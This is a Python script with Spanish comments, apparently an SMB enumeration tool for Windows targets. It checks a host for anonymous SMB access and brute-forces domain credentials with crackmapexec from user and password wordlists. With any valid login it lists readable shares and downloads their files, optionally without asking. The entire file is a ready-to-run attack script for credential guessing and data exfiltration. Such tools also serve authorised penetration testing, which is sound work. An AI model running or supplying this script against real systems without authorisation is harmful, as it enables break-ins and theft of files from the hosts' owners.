import argparse
import subprocess
import re
import sys
import select
import signal

def manejar_interrupcion(sig, frame):
    """ Maneja la interrupción del programa (Ctrl+C) de manera limpia. """
    print("\n[✘] Interrupción detectada. Saliendo del programa de forma segura.")
    sys.exit(1)

# Capturar señales de interrupción
signal.signal(signal.SIGINT, manejar_interrupcion)
signal.signal(signal.SIGTERM, manejar_interrupcion)

def ejecutar_comando(cmd):
    """Ejecuta un comando en la terminal y devuelve su salida filtrada."""
    cmd_str = ' '.join(f'"{c}"' if ' ' in c else c for c in cmd)  # Manejo adecuado de comillas
    print(f"\n[CMD] Ejecutando: {cmd_str}")
    
    resultado = subprocess.run(cmd, capture_output=True, text=True)
    return resultado.stdout.strip()

def verificar_disponibilidad(ip):
    """Verifica si el host está en línea con un ping."""
    print(f"\n[INFO] Verificando disponibilidad del host {ip}...")
    resultado = ejecutar_comando(["ping", "-c", "1", ip])
    if "1 packets transmitted, 1 received" in resultado:
        print(f"[✔] El host {ip} está en línea.")
        return True
    else:
        print(f"[✘] No se pudo alcanzar el host {ip}.")
        return False

def verificar_autenticacion_nula(ip):
    """Verifica si SMB permite autenticación anónima."""
    print(f"\n[INFO] Verificando autenticación anónima en SMB...")
    resultado = ejecutar_comando(["smbmap", "--no-banner", "--no-update", "-H", ip, "-u", "''", "-p", "''"])
    
    if "0 authenticated session(s)" in resultado:
        print(f"[✘] Autenticación anónima no permitida.")
    else:
        print(f"[✔] Autenticación anónima permitida en {ip}.")
        carpetas = listar_compartidos(ip, "", "")
        acceder_carpetas(ip, "", "", carpetas, auto_download=False)

def listar_compartidos(ip, user, password):
    """Lista carpetas compartidas con las credenciales dadas y devuelve las carpetas accesibles."""
    print(f"\n[INFO] Listando carpetas compartidas para {user}@{ip}...")
    resultado = ejecutar_comando(["smbmap", "--no-banner", "--no-update", "-H", ip, "-u", user, "-p", password])
    
    carpetas_accesibles = []
    lines = resultado.split("\n")
    for line in lines:
        if "READ ONLY" in line or "READ, WRITE" in line:
            carpeta = re.split(r'\s{2,}', line)[0].strip()
            carpetas_accesibles.append(carpeta)
            print(f"[✔] Acceso permitido a: {carpeta}")
    
    return carpetas_accesibles

def preguntar_descarga():
    """Pregunta al usuario si quiere descargar archivos con un timeout de 60 segundos."""
    print("\n[?] ¿Quieres descargar los archivos? (Sí/No): ", end="", flush=True)
    
    ready, _, _ = select.select([sys.stdin], [], [], 60)
    if ready:
        respuesta = sys.stdin.readline().strip().lower()
        return respuesta in ["s", "si", "yes", "y"]
    else:
        print("\n[✘] No se recibió respuesta en 60 segundos. Omitiendo descarga.")
        return False

def acceder_carpetas(ip, user, password, carpetas, auto_download):
    """Accede a las carpetas y muestra su contenido."""
    for carpeta in carpetas:
        carpeta_formateada = f'{carpeta}' if ' ' in carpeta else carpeta  # Corrección de comillas
        print(f"\n[INFO] Accediendo a {carpeta_formateada} en {ip}...")
        resultado = ejecutar_comando(["smbmap", "--no-banner", "--no-update", "-H", ip, "-u", user, "-p", password, "-r", carpeta])

        archivos = []
        lines = resultado.split("\n")
        for line in lines:
            if re.search(r'fr--r--r--\s+\d+', line):  # Detectar archivos con permisos de lectura
                archivos.append(line.strip())

        if archivos:
            print(f"\n[✔] Contenido de '{carpeta}': {', '.join(archivos)}")  # Nueva impresión compacta
            for archivo in archivos:
                print(f"    {archivo}")  # También se imprime en formato detallado

            if auto_download or preguntar_descarga():
                descargar_archivos(ip, user, password, carpeta, archivos)
        else:
            print(f"[✘] No se encontraron archivos en '{carpeta}'.")

def descargar_archivos(ip, user, password, carpeta, archivos):
    """Descarga los archivos individualmente usando carpeta/nombre de archivo."""
    print(f"\n[INFO] Descargando archivos de '{carpeta}' en {ip}...")

    for archivo in archivos:
        # Extraer solo el nombre del archivo (última columna de la línea)
        nombre_archivo = archivo.split()[-1]  # Separa la línea y toma el último elemento

        archivo_path = f'{carpeta}/{nombre_archivo}' if ' ' in carpeta or ' ' in nombre_archivo else f"{carpeta}/{nombre_archivo}"
        cmd = ["smbmap", "--no-banner", "--no-update", "-H", ip, "-u", user, "-p", password, "--download", archivo_path]
        ejecutar_comando(cmd)

    print(f"[✔] Descarga completada de '{carpeta}'.")

def fuerza_bruta_credenciales(ip, domain, user_list, pass_list, auto_download):
    """Realiza fuerza bruta en SMB y prueba credenciales válidas."""
    print("\n[INFO] Iniciando fuerza bruta de autenticación...")
    with open(user_list, "r") as usuarios, open(pass_list, "r") as contraseñas:
        for usuario in usuarios:
            usuario = usuario.strip()
            for contraseña in contraseñas:
                contraseña = contraseña.strip()
                credenciales = f"{domain}\\{usuario}:{contraseña}"
                print(f"\n[INFO] Probando autenticación con {credenciales}@{ip}...")
                resultado = ejecutar_comando(["crackmapexec", "smb", ip, "-u", usuario, "-p", contraseña, "--continue-on-success"])
                
                if "[+]" in resultado:
                    print(f"[✔] Credenciales válidas encontradas: {credenciales}")
                    carpetas = listar_compartidos(ip, usuario, contraseña)
                    acceder_carpetas(ip, usuario, contraseña, carpetas, auto_download)
                    return  # Sale si encuentra credenciales válidas
            contraseñas.seek(0)  # Reinicia la lista de contraseñas

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Enumeración de SMB en Windows")
    parser.add_argument("-ip-target", required=True, help="Dirección IP del objetivo")
    parser.add_argument("-user-list", required=True, help="Archivo con lista de usuarios")
    parser.add_argument("-password-list", required=True, help="Archivo con lista de contraseñas")
    parser.add_argument("-domain", required=True, help="Dominio objetivo")
    parser.add_argument("--auto-download", action="store_true", help="Descargar archivos automáticamente sin preguntar")

    args = parser.parse_args()
    
    if verificar_disponibilidad(args.ip_target):
        verificar_autenticacion_nula(args.ip_target)
        fuerza_bruta_credenciales(args.ip_target, args.domain, args.user_list, args.password_list, args.auto_download)
